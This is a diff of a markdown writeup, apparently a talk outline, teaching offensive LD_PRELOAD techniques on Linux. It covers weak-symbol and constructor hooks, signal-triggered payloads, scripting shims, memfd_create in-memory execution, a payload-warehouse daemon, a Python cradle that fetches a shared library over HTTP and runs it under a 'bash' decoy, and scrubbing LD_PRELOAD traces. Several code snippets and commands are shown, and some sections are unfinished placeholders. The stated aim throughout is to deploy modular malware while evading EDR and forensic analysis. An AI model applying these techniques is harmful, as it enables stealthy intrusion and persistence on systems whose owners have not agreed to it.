@@ -46,16 +46,17 @@ We will explore the following practical concepts:
 
 - Showcase and review code techniques available with the Linux linker/loader to assist in achieving the "preload and release" effect in the approved binaries without patching or fully modifying them at runtime.
 - Create malicious library preloads without full knowledge of the internal details of the target binaries.
-- Use library preloading in novel ways over memory.
+- Give the target a malicious constructor/destructor we can bracnh out from.
 - Execute practical preload library chaining in a "split and scatter" fashion to blind EDR heuristics, post mortem forensics, and to gain delayed functionality or features at runtime.
-- Widen the persistence footprint and achieving rapid payload prototyping by post-loading cradles with scripting functionality. 
+- Widen the persistence footprint and achieve rapid payload prototyping by loading malware modules with cradles built around scripting engines.
 
 ### Part 2: Weaponization and Operationalization of Offensive Preloading Techniques
 
 - A Case for practical memory-resident payloads
 - Payload brokers: Inter-process and remote payload loading and hosting
-- Examples of process mimicry and valid decoys
-- Zombie Ant Farm Service: A set of reusable primitives and code constructs for building a servicing modular malware for offensive operators. Fast(er) malware retooling in the field.
+- Examples of process mimicry and decoys
+- Use library preloading in novel ways over memory.
+- Zombie Ant Farm Service: A set of reusable primitives and code constructs for building a modular malware delivery service usable for easier invocation of preloading, achieving fast(er) malware deployment and retooling in the field.
 
 ## Observations
 
@@ -65,12 +66,12 @@ We will explore the following practical concepts:
 
 Functionally, hooking an API assumes that you are implementing an API detour to execute foreign logic, and in the process of achieving this you rely on the following:
 
-- you know how the target API is working, or have a reasonable idea on its exposed interfaces.
+- you know how the target API is working, or have a reasonable idea of its exposed interfaces.
 - you have the ability to target it without detection. E.g. ptrace attach, debugger activity, presence of known tools and libraries for interception, known behavioral signatures.
-- you have the ability to interoperate with the target binary in a clean fashion without crashing it, implement call filters and to extend hooks as needed at runtime.
-- you also may need to have inspection tooling on remote target which may weaken your offensive OpSec. E.g. to hook *that specific use case*, while the mom is watching
+- you have the ability to interoperate with the target binary in a clean fashion without crashing it, implement call filters and properly extend hooks as needed at runtime.
+- you also may need to assume inspection tooling availability on the remote target or bring it int, which may weaken your offensive OpSec. E.g. to hook *that specific use case*, while the mom is watching
 
-These options can be loud on a given system, or you simply may not have the proper setup to analyze and emulate the remote environment for your development and testing purposes.
+These options can be loud on a given system, or you may not have the proper setup to analyze and emulate the remote environment software in full.
 
 *A Case For At-Start Preloading*
 
@@ -80,21 +81,21 @@ What if you could be more agnostic to the exact application API you are trying t
 
 - Preload the payload into a target binary at specific, often known target address, and release the original binary for its full execution lifecycle. The payload executes in the memory space of the target process while the target process runs.
 - Find ways to inject/preload generically, irrespective of the available API. We do not need to hook a specific set of APIs since we are not trying to subvert the target logic per se but only enslaving it to execute our code and use it as a decoy. 
-- Expand malware features by brining mode modules out of band by:
+- Expand malware features by bringing other modules out of band by:
 	- loading via chained preloads
 	- loading via weak references
     - loading via dynamic scripting
-    - loading via payload broker hosts
+    - loading via out of process payload broker hosts
 
 Our goal is to gain a few points over the defense:
 
-- DFIR can lift the pristine target executable, but gets unmodified, clean exe (a cradle or a system binary).
-- EDRs can see the code executing by approved binaries in the process table.
-- EDRs may not be able to fully trace inter-process data handoff (pipes, POSIX shared memory, code over sockets, memory resident executables and shared libraries available over file ephemeral file descriptors, etc.) 
-- Parent / Child process relationships in Linux can be fully transitive. If you have the right to start the parent process, you should be able to fully own its execution resources, and its progeny resources;
-- Limited explicit reliance on `dlopen()` as it may be traced or hooked by EDRs.
+- DFIR can lift the pristine target executable preloaded with malware module, but often gets an unmodified, clean exe (a cradle or a system binary).
+- EDRs can see the code executing by approved binaries in the process table, and therefore trust the integrity of the known process.
+- EDRs may not be able to fully trace inter-process data handoff when preloaded modularized malware call on external data interchange (pipes, POSIX shared memory, code over sockets, memory resident executables and shared libraries available over file ephemeral file descriptors, etc.) 
+- Parent / Child process relationships in Linux can be fully transitive. If you have the right to start the parent process, you should be able to fully own its execution resources, and the resources of its progeny;
+- Limit explicit reliance on `dlopen()` as it may be traced or hooked by EDRs.
 
-    > Note: `dlopen()` API allows you to use libraries that you do not depend on directly (and which may or may not be present on the system at the time of invocation). In case of preloading, the libraries that you do depend on directly (such as `libc.so`, or `<your_payload>.so`) do not need to be `dlopen()`'ed as the loader will have already mapped them for you before your program starts, and are not optional as the loader will fail hard if they are missing.
+    > Note: `dlopen()` API allows you to use libraries that you do not depend on directly at runtime (and which may or may not be present on the system at the time of invocation)i but could be loaded into the process later in process lifecycle. In case of preloading, the libraries that you do depend on directly (such as `libc.so`, or `<your_payload>.so`) do not need to be `dlopen()`'ed as the loader will have already mapped them for you before your program starts.
 
 --- 
 
@@ -102,7 +103,8 @@ Our goal is to gain a few points over the defense:
 
 ### Structure of an ELF binary, Role of the Linker
 
-_Brief overview on ELF construction as pertains to our future discussion. Sections like `.ini/.fini/.preinit/.ctor/.dtor/.interp`_
+_Brief overview on ELF construction as pertains to our future discussion. 
+Sections like `.ini/.fini/.preinit/.ctor/.dtor/.interp`_
 
 ### Practical Techniques and Cases for Introducing Foreign Code in Target Binaries
 
@@ -146,10 +148,11 @@ Discussion:
 
 > The `__libc_start_main()` function shall perform any necessary initialization of the execution environment, call the main function with appropriate arguments, and handle the return from main(). If the main() function returns, the return value shall be passed to the exit() function. `__libc_start_main()` is not in the source standard; it is only in the binary standard.
 
-
-General idea is to hook `main()`, execute payload logic and trampoline back to main. Yes, we can use hooking techniques in preloads.
+General idea is to hook the real `main()`, execute payload logic and trampoline back to it. Yes, we can use hooking techniques in preloads.
 
 Code discussion / demo:
+
+TBD: file name
 
 ```c
 /* Trampoline for the real main() */
@@ -198,7 +201,6 @@ In general, when operating in adversarial environments, we have to accommodate t
 
 An so we will approach solving both of these issues with the discussion below. 
 
-
 To start, a reference:
 
 >gcc(1):
@@ -213,13 +215,13 @@ Suppose that we can drop a rudimentary binary on the disk. Normally, to load log
 
 Example: 
 
-Weak symbols can be created in *your* shim/cradle . The idea is: `main` is a clean executable with exploit delivered in `libweakref.so` out of band
+Weak symbols can be created in *your* shim/cradle (controlled by you in your target binary, or in shared library chain). The idea is: `main` is a clean executable with exploit delivered in `libweakref.so` out of band
 
 `main()` calls ->  weak `debug()` found in `libweakref:debug()`
 
 Code discussion / demo:
 
-`main.c`:
+`main_weakref.c`:
 
 ```c
 void debug() __attribute__((weak));
@@ -264,15 +266,7 @@ $nm /bin/ls
 nm: /bin/ls: no symbols
 ```
 
-Some executables are shipped un-stripped (e.g. /usr/bin/java):
-
-```sh
-$nm /usr/bin/java | grep 'w '
-w __gmon_start__
-w _Jv_RegisterClasses
-```
-
-However, there may be chances to find the weak references for the stripped executables:
+However, there may be chances to find the weak references in the stripped executables as well:
 
 ```sh
 $nm --dynamic  /bin/ls | grep 'w '
@@ -280,6 +274,14 @@ w __cxa_finalize
 w __gmon_start__
 w _ITM_deregisterTMCloneTable
 w _ITM_registerTMCloneTable
+```
+
+Some product executables are shipped un-stripped (e.g. /usr/bin/java):
+
+```sh
+$nm /usr/bin/java | grep 'w '
+w __gmon_start__
+w _Jv_RegisterClasses
 ```
 
 As you can see symbols `__gmon_start__` and `__cxa_finalize` seem to be present and weak. Most importantly, they are consistently present in many target executables. We can preload most of ELF executables with the following code:
@@ -336,14 +338,14 @@ Note:
 
 > Here we are escaping double-execution of a hook by checking if `__gmon_start__` is already hooked
 
-As you can see with weak symbols we are not explicitly working with `dlopen()/dlsym()` _RTLD_*_'s. Again we only want our code to execute in the context of a live whitelisted executable using it as a decoy. Liveness of the decoy process (no crash) and proper appearance in the process table is prioritized.
+As you can see with weak symbols we are not explicitly working with `dlopen()/dlsym()` _RTLD_<>'s. Again we only want our code to execute in the context of a live whitelisted executable using it as a decoy. Liveness of the decoy process (no crash) and proper appearance in the process table is prioritized.
 
-_ProTip_: Also note, some executables do not honor `__cxa_finalize` invocation probably due to implemented `atexit()` handlers. but you could always find other decoys.
+_ProTip_: Also note, some executables do not honor `__cxa_finalize` invocation probably due to implemented `atexit()` handlers. but you could always find other decoys. Also, noone says we have to trigger paylaods soon after the process start. We can wait until the process is about to exit and then trigger in the destructor or in atexti(3) hooks.
 
 
 ##### 0x2:C: Chained weakrefs
 
-We have shown that we could find and resolve symbols at runtime with weak references. However, can evade even deeper by _scattering_ weak references across a series of smaller preloaded libraries, and assemble the lookups in memory.
+We have shown that we could find and resolve symbols at runtime with weak references. However, let's see how we can evade even deeper by _scattering_ weak references across a series of smaller preloaded libraries, and resolve the lookups in memory at runtime.
 
 Here we employ the same technique as in the first scenario (main) but weak symbols are exported from the downstream library:
 
@@ -365,7 +367,7 @@ int main(void)
     }
 
     if (mstat) {
-        printf("main: test trampoline to stat()\n");
+        printf("main: test trampoline to mstat()\n");
         mstat();
     }
 }
@@ -408,7 +410,7 @@ main: debug()
 debug()
 debug: stat()
 mstat()
-main: test trampoline to stat()
+main: test trampoline to mstat()
 mstat()
 in __cxa_finalize weak hook
 in __cxa_finalize weak hook but already started
@@ -419,13 +421,13 @@ So as you could see chained preloads work as deep as you need them to work, assi
 
 #### 0x3: `.CTOR/.DTOR` via gcc `__attribute__((constructor (P)))` and `__attribute__((destructor (P)))`
 
-So this preload/hook method is the crux of our further payload preload automation chain. This is how we are planning to execute our "preload and release" approach in a binary agnostic manner. 
+So this preload/hook method is the crux of our further payload preload automation chain. This is how we are planning to execute our "preload and release" strategy in a binary agnostic manner. 
 
 Brief Highlights:
 
 - Direct constructors and destructors
 - Chained / prioritized constructors and destructors
-- Hijacking arguments. 
+- Hijacking program arguments. 
 
 [Ref:] (https://gcc.gnu.org/onlinedocs/gccint/Initialization.html)
 
@@ -489,9 +491,9 @@ This proves useful when target binaries provided protection and anticipated the 
 
 
 #### 0x3:C Hijacking CTOR arguments.
-One edge case that allows our preloads to work across a wide variety of target executables that for example re invoked with command parameters, is to accommodate overloaded `main()`s.
+One edge case that allows our preloads to work across a wide variety of target executables is ability to accommodate overloaded `main()`s.
 
-As we know the constructor is called by `ld.so` loader before `main()`. So conceivably we can hijack parameterized versions of `main()` with the following code constructs. (As per documentation, this is not  very portable and probably not guaranteed but works. `¯\_(ツ)_/¯` )
+As we know the constructor is called by `ld.so` loader and libc bootstrapping routines before the `main()`. So conceivably we can hijack parameterized versions of `main()` with the following code construct. (As per documentation, this is not  very portable and probably not guaranteed but still works. `¯\_(ツ)_/¯` )
 
 Code discussion / demo
 
@@ -502,7 +504,7 @@ __attribute__((constructor)) static void mctor(int argc, char **argv, char** env
 #### Ox4: Out of band signals and exception handlers, timed execution and fault branching
 As we have discussed prior, we have to manage both of the scenarios when we _can_ bring in code cradles into the environment and when we _cannot_ do so.
 
-Depending on the circumstances, to evade EDRs we can use non-linear invocation of code. The general task is to break the EDR consistent "story" of target lifecycle transparency with out of band interrupts. Since interrupts arrive from the outside of the process many defenses cannot trace the code paths. It's an unconditional jump to the handler. 
+Depending on the circumstances, to evade EDRs we can use non-linear invocation of code. The general task is to break the EDR consistent "story" of target execution transparency with out of band interrupts. Since interrupts arrive from the outside of the process many defenses cannot trace the code paths. It's an unconditional jump to the handler. 
 
 Sometimes, it is non-blocking or non-instrumentable, as we can see below. Triggering code from an otherwise dormant code branch we can achieve deeper evasion. 
 
@@ -560,7 +562,8 @@ Executing payloads here ...
 bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh
 ```
 
-> Note: External asynchronous trigger of a code branch. This can also help with sandbox profiling. For example, the *real* payload branch is only triggered from an external event (signal, etc.)
+> Pro-Tip: External asynchronous trigger of a code branch can also help with sandbox profiling. For example, the *real* payload branch is only triggered from an external event (signal, etc.)
+
 
 ##### 0x4:B. A variation on the theme: Fault based (SIGFPE) handlers
 Some signals and faults are even harder to handle and supervise by EDRs
@@ -711,17 +714,19 @@ Trigger SIGFPRE handler
 In SIGFPE handler
 1 / 0: caught division by zero!
 Executing payloads here ...
+
+bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh
 ```
 
 ## Expanding and Scaling the Evasion Capabilities
 
 Or, _Guiding the ant to its final destination..._
 
-We have talked about the evasion primitives as far as preloading either our rudimentary cradle/shim with malicious payloads, or to use approved system binaries as decoys via preloads. Let's explore how the concepts can be expanded upon. In adversarial defensive environments, the more choices we hacker have the better.
+We have talked about the evasion primitives as far as preloading either our rudimentary cradle/shim with malicious payload libraries, or to use approved system binaries as decoys via preloads. Let's explore how the concepts can be expanded upon in adversarial defensive environments. The more choices we hackers have, the better.
 
 Highlights:
 
-- Hiding from EDRs via existing trust binaries decoys.
+- Hiding from EDRs via existing trusted binary decoys.
 - Expanding dynamic scripting capabilities in the field.
 - Progressive LD_PRELOAD command line evaders.
 - Malware evaders with Self-preservation instincts.
@@ -794,9 +799,9 @@ $LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2
 
 #### 0x2: Hiding Behind Reflective Mirrors
 
-So by now we've lost EDRs in our dust for a time being by jumping around the decoys and preloads. Another evasion vector that really comes out of necessity for rapid prototyping and development of modular malware rather than EDR evasion as a primary goal - is interfacing with higher level code and better features. 
+So by now we've hopefully evaded EDR watchful eyes by jumping around the various decoys and preloads. Another evasion vector that really comes out of necessity for rapid prototyping and development of modular malware rather than EDR evasion as a primary goal - is interfacing with higher level code.
 
-Let’s face it: development in C _can be_ slower for some. While it is a great system language (and we will see that more and more later), offensive operators need to retool quickly as their landscape and context changes. It’s just the reality of operating malware nowadays. Self-upgrades, better evasions, etc. So, one of the paths that may serve both goals: evasion and rapid prototyping of features is to see how we can extend the modularity to other the stacks of languages that have decent FFI (Foreign function interface) with C and that could create shared libraries we can use in the type of preloads we have discussed before.
+Let’s face it: development in C _can be_ slower and error prone for some, ant it also requires compilation. While it is a great system language, offensive operators often need to retool quickly as their circumstances onthe target box change. It’s just the reality of operating malware nowadays. Self-upgrades, better evasion, etc. So, one of the paths that may serve both goals: evasion and rapid prototyping of new features, etc. is to see how we can extend the modularity of our malware modules to dynamic languages that have decent FFI (Foreign function interface) with C and that could create shared libraries that we can use in the type of preloads we have discussed before.
 
 Discussion and highlights : 
 - Golang via cgo
@@ -811,6 +816,7 @@ Discussion of Code / demo
 // go build -o shim.so -buildmode=c-shared shim.go
 
 // [Ref:](https://medium.com/learning-the-go-programming-language/calling-go-functions-from-other-languages-4c7d8bcc69bf)
+
 package main
 
 
@@ -834,7 +840,7 @@ func main() {}
 
 ##### 0x2:B: Embedding Interpeters
 
-We want interpreters for speed, but also sometimes for a great deal of reflection EDR might get blind unraveling the call chain to a verified IoC. 
+We want interpreters and dynamic code for speed of development, yes, but also for a great deal of reflection. EDRs might just get blind tracing such a call chain to a verified IoC. 
 
 So, we "evade into reflection and back", sort of as a side benefit to our dynamic code prototyping.
 
@@ -895,9 +901,10 @@ ldd invoke_lua
     ....
 ```
 
-Notice the shared library is missing. This is an opportunity to fill the void with a preload as we have discussed before:
+> Notice the shared library is missing. This is an opportunity to fill the void with a preload as we have discussed before:
 
 - "Scatter gather" payloads residing in dependencies. 
+
 > Pro-tip: We either have all of the dependencies met, or the payload does not (properly) run. 
 - Invoke Lua script via `C` shim preloading `liblua.so` as dependency
 
@@ -913,7 +920,7 @@ TODO: <output>
 
 And then the world is your oyster, if you can escape out to scripting and start loading other libraries at runtime:
 
-> Pro-tip: Another abstraction layer
+> Pro-tip: Use it as another abstraction layer, e.g. socket out or pipe out to another process hosting additional payloads
 
 Code discussion / demo
 
@@ -933,7 +940,7 @@ print("Server on " .. ip .. ":"..port)
 
 -- via path
 local rhost = "127.0.0.1"
-local rport = "1337"
+local rport = "8080"
 assert(tcp:connect(rhost,rport));
   while true do
     local r,x=tcp:receive()
@@ -946,9 +953,9 @@ tcp:close()
 ```
 As you can see we no longer need to load shared libraries, we can use code which is much easier to manage, stuff a string into memory, for example and invoke.
 
-## Weaponizing preloads
+## Part 2: Weaponizing preloads
 
-So now that we have some baseline built, and have ideas on how to expand our preloading cradles, let's see how these concepts can be weaponized in the wild. Let's also add a bit more techniques to our evasion toolbox as we go. 
+So now that we have some baseline built, and have ideas on how to expand our preloading cradles, let's see how these concepts can be weaponized in the wild. Let's also add a few more techniques to our evasion toolbox as we go along. 
 
 Highlights:
 
@@ -958,7 +965,8 @@ Highlights:
 
 ### Inline Parameterized Command Evasion. Uber-preloaders
 
-The first impulse is to use `LD_PRELOAD` for a lot of things static:
+The first impulse is to directly use `LD_PRELOAD` for a lot of things static, as we have seen before
+
 ```sh
 $LD_PRELOAD=./lib/libctx.so.1 /bin/ls
 ```
@@ -969,7 +977,7 @@ What if we want more features and flexibility. We could do:
 $LD_PRELOAD=./lib/libctx.so.1 /bin/ls <preloader_arguments>
 ```
 
-Oh wait, not we cannot, as the arguments will be consumed by the target unless you do some specific processing with the parameters as you hook the main:
+No, this will not work, of course, as the arguments we wanted to end up being used by the preloader will actually be consumed by the target unless you do some specific processing with the parameters as you hook the main:
 
 ```c
 __attribute__((constructor)) static void _mctor(int argc, char **argv, char** envp)
@@ -981,7 +989,7 @@ __attribute__((constructor)) static void _mctor(int argc, char **argv, char** en
      lenvp=envp;
      lenvp_start=envp;
 ```
-It's prone to errors. We could actually solve it by moving backwards in the command line and stuffing arguments into environment variables like so:
+Possibly but close coupled to specific context, and prone to errors. We could solve the issue by moving backwards in the command line and stuffing arguments into environment variables like so:
 
 ```sh
 LD_BG="false" LD_PCMD="r:smtp" LD_MODULE="./lib/shim.so" LD_MODULE_ARGS="hello" LD_PRELOAD=./lib/libctx.so.1 /bin/ls 
@@ -989,7 +997,7 @@ LD_BG="false" LD_PCMD="r:smtp" LD_MODULE="./lib/shim.so" LD_MODULE_ARGS="hello" 
 
 So, our preloader just gained parameterized execution capabilities. In this case it could say: "Hey, I am preloading a module and passing an argument to it. And by the way, I want this target to go into the background when executing (daemonization), and I want to further hide in the process table as process named `smtp`". 
 
-> We can use the preloader to pass both the module path and the arguments. We can preload the module with all the available methods as we have discussed above (e.g. constructors, etc.) or, we can simply lock on a API interface contract to invoke in the module. For example, we can stipulate that the module export a function `int Entry(char* params)` so we can search and invoke it dynamically like so:
+> Pro-tip: We can use the preloader to pass both the module path and the arguments. We can preload the module with all the available methods as we have discussed above (e.g. constructors, etc.) or, we can simply lock on a API interface contract to invoke in the module. For example, we can stipulate that the module export a function `int Entry(char* params)` so we can search and invoke it dynamically like so:
 (Ok, we can use some `dlopen()`'s here ;) )
 
 Code example discussion / demo
@@ -1023,7 +1031,7 @@ Code example discussion / demo
      ... */
 ```
 
-Remember `cgo` shim? We can invoke *any* module with the chained preloader:
+Remember `cgo` shared library we have created out of Golang code? We can invoke *any* module with the chained preloader:
 
 Example:
 ```sh
@@ -1056,14 +1064,14 @@ Useful links:
 
 We have built an uber-preloader, that can chain other modules, and can have other features like signal handling-based payload execution, IPC communication and whatever else you can think of and your environment allows you to do. However, there is one small problem: those modules are files. On disk. Scannable and inspectable by EDRs. And admins :) 
 
-Let's see if we can fix that. Well, the way to fix that is to load modules in memory and execute them from memory. Just know, that every time you say the first part of the phrase your system will help you. Every time you get to the second part, your system will fight you. 
+Let's see if we can fix that. Well, the way to fix that is to load modules in memory and execute them from memory. Easier said than done, in that every time you say the first part of the last sentence, expect that your system will help you. Every time you get to the second part - your system will fight you. 
 
 On Linux, there are  several ways to operate shared memory as far as files go. You have `tmpfs` filesystem (most often via `/dev/shm`), and you have to be root to mount others. You have POSIX shared memory, memory `mmap()`'d files. Some you cannot execute code from others do not provide you memory only abstraction, leaving a file path visible for inspection. 
 
 However, as of kernel 3.17 Linux gained a system call  [memfd_create(2)](http://man7.org/linux/man-pages/man2/memfd_create.2.html) 
 
 From the sources:
-> memfd_create() creates an anonymous file and returns a file
+> `memfd_create()` creates an anonymous file and returns a file
 descriptor that refers to it.  The file behaves like a regular file,
 and so can be modified, truncated, memory-mapped, and so on.
 However, unlike a regular file, it lives in RAM and has a volatile
@@ -1084,11 +1092,14 @@ if (shm_fd < 0) {
 }
 ```
 
-One the file is in memory we can execute it with [fexecve(3)](https://linux.die.net/man/3/fexecve) (or emulate it with `execve(3)`
+Once the file is in memory we can execute it with [fexecve(3)](https://linux.die.net/man/3/fexecve) (or emulate it with `execve(3)`
 
-To anyone who is looking no `readlink(3)` can be made on it, but beyond that execution will work!
+To anyone who is looking into the call's inner workings know that it's not exactly an inode (no `readlink(3)` can be made on it), but beyond that execution will work!
 
-The `memfd_create()`'d file will be a file descriptor of the following format:  
+> Pro-Tip: Failure of readlnk(3) is exactly why Golang plugins cannnot be invoked from memory (yet). would be nice though.
+
+
+The `memfd_create()`'d file will be a file descriptor of the following format (the number after `memfd:` is custom, you can have anything there) :  
 
 ```sh
 $ ls -l /proc/56417/fd
@@ -1111,16 +1122,23 @@ LD_PCMD="r:smtp" LD_MODULE="/proc/56417/fd/3" LD_MODULE_ARGS="hello" LD_PRELOAD=
 
 EDRs might have a little trouble chasing after this. But wait, what is process id `56417` and how did this module get there?
 
+> For now just know that `56417` is the PID of *any* process your id can control. This is big as we will see later. Remember we said . linux parent child relationship is transitive and you could get access to parent and child resources interchangeably? WE shall dive deeper in the next section.
+
+
 ### Modular Malware Payload Warehouses: Remote module loads
 
-Ok, so we now have an uber loader that can load all kinds of modules, and we know how to drive memory-resident modules. As offensive operators we are lazy, and prefer to build even more modular malware. What if we have a store of modules/payloads _somewhere_ in memory we can consistently refer to as we operate. That store will have a protocol to load the remote or local malware modules in memory and we just need to reference them by file descriptors as our uber-preloader did. 
+Ok, so we now have an uber loader that can load all kinds of modules, and we know how to chain memory-resident modules. We may prefer to build an even more modular malware delovery system, with even greater evasion capability. What if we have an out of target process store of modules/payloads. The payloads will be _somewhere_ in memory , and we would consistently refer to them as we operate? That store could have a protocol to load the remote or local malware modules in its memory and we would just need to reference them by file descriptors in our preloaders.
+
 
 Enter `Zombie Ant Framework Service`. It is an uber preloader assistant. 
+
+Discussion: / Arch diagram of operation
+
  - Daemon. Backgrounds itself, mimics and decoys by specified process name.
  - Accepts commands over socket. Fetches remote payloads and stores them in memory. 
  - Runs an in-memory list of available modules, opens payloads to all local preloaders. Provides "Preload-as-a-Service" capability. LOL 
  - At the request of an operator de-stages malware modules. 
- - Has JSON command interface to extend commands as you please.
+ - Has JSON command interface to extend commands as needed.
 
 Example of the no-dependency client to operate ZAFSrv, you can build your own.:
 
@@ -1167,23 +1185,22 @@ cat<<! 1>&3
 }
 ```
 
-*ZAF Demo*
+*ZAF Demo* here .... 
 
-Now you know what process `56417` is ;) 
+And now you know what process `56417` is ;) 
 
 ## The Catch 22: Operationalizing Dynamic Preload Cradles
 
-We know how to preload, we have some better ideas on  how to write modules, we have payload warehouses that would stealthily serve us paths to modularized malware.
+We know how to preload, we have some better ideas on how to write preloader modules, we have payload warehouses that would stealthily serve us paths to modularized malware.
 
 ```
-Q: What came first: ZAF or the preloader?
+Q: What came first: ZAF service process or the preloader?
 A: Pypreload, of course.
 ```
 
-One of the issues hackers face is how do we create stealthy first mile delivery mechanism. If the first cradles is a binary we need to drop on disk, we may lose. Why not then fetch our ZAFSrv which will take over memory based payload storage and management via a non-binary. Maybe a Python script? Do you mean, fetch and execute ZAFsrv in memory? 
+One of the issues hackers face is how do we bring the first cradle that starts the chain of malware loading? If the first cradle is a binary we need to drop it on disk, and so we may lose there. Why not then see if we can fetch our modules or even warehousing daemon (which will take over memory based payload storage and management) via memory driven mechanism itself. Maybe a Python script? Do you mean, fetch and execute a process *in memory*? 
 
-Yes, that is what I mean. Python can do `memfd_create()`!
-Well, over `ctypes` FFI interface.
+Yes, that is what I mean. Python can do `memfd_create()`!  Well, over `ctypes` FFI interface.
 
 Example:
 `pypreload.py`
@@ -1217,11 +1234,14 @@ Example:
 ```sh
 $ pypreload.py  -t so -l http://127.0.0.1:8080/libmctor.so -d bash -c /bin/ls
 ```
-Here, we fetch our malware module into memory, and execute its functionality preloading a decoy command, all in memory.
+Here, we fetch our malware module into memory, and execute its functionality preloading a decoy command (bash), all in memory. 
+
+> Note: `bash` here is the decoy for the process name we do not use any bash functionality. It just looks good in the process table :)
+
 
 Consider execution context:
 
-Internal OS file descriptors for pypreload fetcher cradle:
+Internal OS file descriptors for pypreload fetcher cradle during runtime:
 
 ```sh
 $ ls -l /proc/56417/fd
@@ -1243,7 +1263,7 @@ l-wx------ 1 root root 64 Feb 17 17:55 1 -> 'pipe:[3478476]'
 l-wx------ 1 root root 64 Feb 17 17:55 2 -> 'pipe:[3478477]'
 ```
 
-Process tree: Where is Waldo?  ;)
+Process tree: Where is Waldo? We only see .. `bash` invoking `ls`  ;)
 
 ```sh
 56417 pts/6    S+     0:00                  |   |   |   \_ bash
@@ -1285,7 +1305,9 @@ Where is Waldo, really?
 
 ### Protecting your Cradles and Preloaders
 
-After the dust settles, and your EDRs are hopefully lost in the forest of process trees, memory descriptor that lead nowhere and zombies, and ants (lol), you have to remember that the next time you face them they will be ready. Take steps to protect your payloads. Either via additional evasion capabilities, encryption, or other novel ways to be curious, inquisitive and overserving. 
+A few words of caution:
+
+After the dust settles, and your EDRs are hopefully lost in the forest of process trees and zombie process ant targets compelled to run your code (lol), you have to remember that the next time you face them they will be ready. Take steps to protect your payloads. Either via additional evasion capabilities, encryption, or other novel ways to be curious, inquisitive and overserving. 
 
 Some ideas and tips below, I also hope defensive hackers take note ;)
 
@@ -1293,7 +1315,7 @@ Some ideas and tips below, I also hope defensive hackers take note ;)
 
 [Really good writeup on how to detect LD_PRELOAD and clean it](https://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/)
 
-Take lessons from rootkits to remove your LD_PRELOAD presence from processes (ZAFSrv does that), so does the preload PoC.
+Take lessons from rootkits to remove your LD_PRELOAD presence from processes (hint: ZAFSrv does that, so does the uber-preload PoC).
 
 Example:
 
@@ -1326,8 +1348,7 @@ void cleanEnv(char* ldvar, int ldlen){
 
 #### Race to preload
 
-If someone used `.init` et al to preload your cradles. e.g. sandbox, you could still survive:
-
+If someone used `.init/.fini` sections et al to preload *your* cradles (e.g. sandbox), you could still survive:
 
 > Q: Remember `.init_array` ... ? 
 
